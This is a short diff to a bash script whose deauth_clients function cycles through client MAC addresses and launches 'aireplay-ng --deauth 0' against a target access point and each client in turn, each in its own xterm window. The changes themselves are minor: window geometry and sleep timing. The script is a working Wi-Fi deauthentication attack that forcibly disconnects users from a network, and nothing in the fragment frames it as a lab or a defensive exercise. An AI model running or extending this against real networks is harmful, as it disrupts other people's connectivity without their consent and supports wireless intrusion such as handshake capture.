@@ -28,7 +28,7 @@ deauth_clients () {
         
         if [[ "$ccl" =~ $macrgx ]]
         then
-            xterm -T "$ccl" -fg green -bg black -e "aireplay-ng --deauth 0 -a ${bssid} -c ${ccl} ${iface}" &> /dev/null &
+            xterm -T "$ccl" -fg green -bg black -geometry 90x20-50-50 -e "aireplay-ng --deauth 0 -a ${bssid} -c ${ccl} ${iface}" &> /dev/null &
             cpd=$!
 
             idx+=1
@@ -39,7 +39,7 @@ deauth_clients () {
                 update_clients
             fi
         
-            sleep 7
+            sleep 6
             kill $cpd
         fi
     done
@@ -49,7 +49,7 @@ main () {
     iface=$1
     bssid=$2
     
-    sleep 2.5
+    # sleep 2.5
 
     deauth_clients
 }
